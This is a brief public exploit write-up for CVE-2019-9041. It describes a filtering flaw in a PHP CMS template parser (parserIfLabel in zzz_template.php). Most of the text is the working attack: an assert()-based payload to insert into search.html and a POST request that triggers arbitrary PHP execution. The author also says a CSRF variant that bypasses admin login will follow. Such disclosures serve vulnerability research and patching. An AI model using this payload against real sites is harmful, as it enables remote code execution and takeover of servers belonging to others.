# CVE : CVE-2019-9041

Due to the failure of filtering function parserIfLabel() in inc/zzz_template.php, attackers can insert dynamic php code into the template file and leads to dynamic code evaluation.

Exploit:
login in to the admin panel, edit the template of search.html, insert the following code:

{if:assert($_POST[x])}phpinfo();{end if}

Visit the http://webroot/search/ and post data “x = phpinfo();”, the page will execute the php code “phpinfo()” as follow:

Remarks:
While the above exploit requires attackers to have the access to the admin panel, I will post another exploit by using csrf to acquire the control of website without access to the admin panel.
